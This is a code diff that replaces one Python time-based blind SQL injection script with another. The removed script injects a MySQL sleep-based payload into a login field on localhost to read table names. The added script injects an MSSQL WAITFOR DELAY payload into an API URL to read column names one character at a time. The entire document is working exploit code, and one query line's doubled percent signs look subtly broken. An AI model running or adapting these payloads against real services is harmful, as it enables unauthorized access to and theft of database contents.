@@ -1,23 +1,20 @@
-import time, requests, sys
-
-url="http://localhost"
-cset = ",abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_+-0123456789"
-#cookie={'xxx':'xxx'}
-proxy={'http':'http://127.0.0.1:8080'}
-s = requests.session()
-header={'Content-Type':'application/x-www-form-urlencoded'}
-x=1
-while 1:
-	for i in range(0,len(cset)):
-		a=time.time()
-		data='username=xxx\';select IF(MID((select group_concat(table_name,0x2C) from information_schema.tables WHERE table_schema=database()),'+str(x)+',1)=\''+cset[i]+'\',sleep(3),1)#'
-		r = s.post(url, data=data, proxies=proxy, headers=header)
-		b=time.time()
-		if float(b-a)>3.0:
-			#sys.stdout.flush()
-			sys.stdout.write(str(cset[i]))
-			sys.stdout.flush()
-			break
-		else:
-			pass
-	x+=1
+import time,requests,sys
+data=""
+for x in range(1,100):
+    for i in range(32,126):
+        t1=time.time()
+        url="https://x.com"
+        url+="/api/v1/aaaaa/bbbbbbbbb/859349;DECLARE%20@x%20CHAR(9);SET%20@x=0x303a303a33;IF%20(ascii(SUBSTRING(("
+        #url+="SELECT%20DB_NAME(0)"   # sql query
+        #url+="SELECT%20TOP%201%20name%20FROM%20sysobjects"   # sql query
+        url+="SELECT%%20TOP%%201%%20name%%20FROM%%20SYSCOLUMNS%%20WHERE%%20id=(SELECT%%20id%%20FROM%%20SYSOBJECTS%%20WHERE%%20name%%20=%%27ADDITIONAL_RECIPIENT_FIELDS%%27)"
+        url+="),"+str(x)+",1))="+str(i)+")%20WAITFOR%20DELAY%20@x--"
+        #print url
+        r=requests.get(url)
+        t2=time.time()
+        if float(t2-t1)>6.0:
+            sys.stdout.flush()
+            sys.stdout.write(str(chr(i)))
+            data += str(chr(i))
+            break
+print data
